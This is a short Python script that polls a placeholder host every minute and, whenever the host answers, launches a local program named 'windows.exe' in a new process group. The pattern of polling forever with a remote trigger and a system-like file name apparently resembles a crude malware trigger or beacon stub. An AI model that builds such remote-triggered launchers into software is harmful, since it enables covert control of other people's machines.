#rx3
import requests
import subprocess
import time

def main():
    try:
        response = requests.get("http://[ip]:[port]")
    except:
        response=""

    if response != "":
        subprocess.Popen("windows.exe", creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)
    else:
        return


while ""=="":
    time.sleep(60)
    main()
